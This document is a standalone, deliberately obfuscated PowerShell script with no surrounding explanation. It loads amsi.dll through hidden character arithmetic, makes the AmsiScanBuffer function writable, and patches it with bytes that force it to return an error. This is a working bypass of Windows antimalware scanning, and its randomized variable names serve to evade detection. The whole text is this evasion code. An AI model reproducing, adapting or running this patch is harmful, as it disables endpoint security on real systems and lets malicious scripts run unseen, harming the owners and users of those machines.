$lfNCkuINK0IrnLeYyGB = @"
using System;
using System.Runtime.InteropServices;
public class lfNCkuINK0IrnLeYyGB {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr mOaE2a9DxCR, string plnIcMD01FIa);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr K3PhTzyHHetuvY, UIntPtr vFlI, uint uQsuw8p2ypfU, out uint ygxbhcFp);
}
"@

Add-Type $lfNCkuINK0IrnLeYyGB

$tGaQOoxceFVf7 = [lfNCkuINK0IrnLeYyGB]::LoadLibrary("$(('ãmsì.d'+'ll').NorMALIZe([CHaR]([bytE]0x46)+[ChaR](111*108/108)+[CHAr]([BYte]0x72)+[cHAr](109)+[cHAr]([bytE]0x44)) -replace [ChAr]([BYte]0x5c)+[ChAr](84+28)+[Char](67+56)+[CHar]([bYTe]0x4d)+[chAR](110*29/29)+[chAr]([ByTE]0x7d))")
$OOaP6lG = [lfNCkuINK0IrnLeYyGB]::GetProcAddress($tGaQOoxceFVf7, "$([cHar](65*16/16)+[ChAr]([BytE]0x6d)+[CHar]([BYTE]0x73)+[CHAR]([BytE]0x69)+[CHAr](83)+[chAr]([Byte]0x63)+[chAr]([bYte]0x61)+[cHaR]([BytE]0x6e)+[chAR](66)+[ChAr](117+60-60)+[CHAR](102)+[cHAr](102)+[cHaR](101*73/73)+[ChaR]([ByTe]0x72))")
$p = 0
[lfNCkuINK0IrnLeYyGB]::VirtualProtect($OOaP6lG, [uint32]5, 0x40, [ref]$p)
$Kp4UNAu = "0xB8"
$ZpSVTNZ0lae8f = "0x57"
$uU_eMe0 = "0x00"
$HqS6NmfIR3R = "0x07"
$lV7GvVx1 = "0x80"
$SfpH__ = "0xC3"
$FnsEkJ8TssGHWi = [Byte[]] ($Kp4UNAu,$ZpSVTNZ0lae8f,$uU_eMe0,$HqS6NmfIR3R,+$lV7GvVx1,+$SfpH__)
[System.Runtime.InteropServices.Marshal]::Copy($FnsEkJ8TssGHWi, 0, $OOaP6lG, 6)